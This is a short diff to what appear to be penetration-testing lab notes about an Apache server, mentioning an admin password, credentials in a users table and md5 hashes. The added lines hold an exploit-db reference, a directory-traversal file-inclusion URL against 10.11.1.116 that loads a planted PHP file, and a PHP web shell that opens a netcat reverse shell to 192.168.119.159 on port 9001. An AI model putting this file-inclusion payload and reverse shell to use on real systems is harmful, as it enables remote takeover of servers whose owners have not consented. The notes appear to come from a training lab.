@@ -8,3 +8,9 @@ password admin
 looking at creds under the users table
 
 server is a linux apache server, likley using md5 hashes
+
+https://www.exploit-db.com/exploits/25971
+
+http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../usr/local/databases/hack.php
+
+<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.159 9001 >/tmp/f")?>
